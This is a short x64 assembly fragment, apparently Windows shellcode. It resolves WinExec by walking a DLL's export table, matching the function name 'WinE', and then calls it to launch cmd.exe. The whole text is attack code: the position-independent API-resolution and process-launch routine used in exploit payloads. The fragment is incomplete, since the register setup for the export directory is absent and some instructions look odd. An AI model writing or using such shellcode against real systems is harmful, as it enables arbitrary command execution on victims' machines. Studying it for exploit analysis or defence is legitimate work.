    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    dw 0x3333

cmp_func_name:
    cmp eax, 0x456E6957         ; 'WinE'
    je call_winexec

find_winexec_x64:
    xor r10, r10
    xor r8, r8
    mov r10w, [r8+r13]          ; r10 = Ordinal Number
    mov r8d, [r12 + r10 * 4]    ; r8 = Name RVA
    add r8, rcx                 ; r8 = Function Name VA
    mov eax, [r8+rdx]           ; eax = Function Name
    add r13, 0x2
    jmp cmp_func_name

call_winexec:
    mov r8d, [r15 + r10 * 4]    ; r8 = Function RVA (AddressOfFunctions + (OrdinalNumber * 4))
    add r8, rcx                 ; r8 = Function VA

    mov rcx, rdi                ; RCX = &(cmd.exe)
    inc dl                      ; uCmdShow = SW_SHOWNORMAL  

    ; make stack space, optional
    add sp, 0x880

    call r8